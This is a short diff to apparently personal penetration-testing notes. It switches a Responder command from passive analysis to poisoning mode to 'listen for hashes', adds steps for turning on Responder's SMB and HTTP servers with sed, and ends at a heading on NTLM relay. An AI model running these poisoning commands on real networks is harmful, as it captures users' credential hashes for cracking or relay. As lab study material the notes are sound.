@@ -112,13 +112,14 @@ xfreerdp /v:192.168.161.221 -sec-nla
 ```
 
 
-Analyze behavior over network without responding
+##### Poisoning
+###### Listen for hashes
 ```
-sudo responder -I tun0 -A
+sudo responder -I tun0
 ```
-- can use this in combination with other exploits to see if anything is replayable
 - make sure to enable SMB with `cat /usr/share/responder/Responder.conf | grep -i smb`
 	- if Off, use `sudo sed -i "s/SMB = Off/SMB = On/" /usr/share/responder/Responder.conf` to turn it On
+- also make sure http is on, same as above
 
 ***NTLM Relay over SMB***
 ```
